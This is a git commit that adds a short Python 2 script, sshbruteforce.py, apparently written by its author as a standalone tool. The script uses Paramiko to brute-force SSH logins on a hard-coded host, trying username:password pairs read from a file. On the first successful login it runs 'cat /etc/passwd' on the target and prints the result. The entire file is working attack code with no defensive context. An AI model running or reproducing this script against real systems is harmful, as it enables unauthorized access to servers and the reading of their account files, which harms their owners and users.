fca8161a2e928165dece7e63911e4e0f76168c36
abhinav singh <abhinavbom@gmail.com>
2014-11-01 15:47:55 +0530

    Create sshbruteforce.py

---
+++ sshbruteforce.py
@@ -0,0 +1,39 @@
+#-------------------------------------------------------------------------------
+# Name:        SSH-BruteForce
+# Purpose:      Following script will bruteforce SSH login using Paramiko
+#               http://www.paramiko.org/en/latest/
+# Author:      darklord
+#
+# Created:     19/10/2014
+# Copyright:   (c) darklord 2014
+# Licence:     MIT
+#-------------------------------------------------------------------------------
+
+import paramiko
+import sys
+
+ssh = paramiko.SSHClient()          #Set up Paraniko SSh client
+OFFSITE_IP = '192.168.0.23'         #Enter the IP where the SSH client is installed
+PORT_NO = 22
+#USERNAME = 'root'
+#PASSWORD = 'root'
+ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())   # Define authentication key
+
+fd = open(sys.argv[1], 'r')         # Pass the text file you want the script to read from
+                                    # The format of the text file should be username:password
+
+for line in fd.readlines():
+    user_pass = line.strip().split(':')
+    try:
+        ssh.connect(OFFSITE_IP, PORT_NO, username=user_pass[0], password=user_pass[1])
+    except paramiko.AuthenticationException:
+        print 'username %s and password %s is incorrect' %(user_pass[0], user_pass[1])
+    else:
+        print 'username %s and password %s succesfully logged in' %(user_pass[0], user_pass[1])
+
+
+        stdin, stdout, stderr = ssh.exec_command('cat /etc/passwd')
+
+        for line in stdout.readlines():
+            print line.strip()
+        break
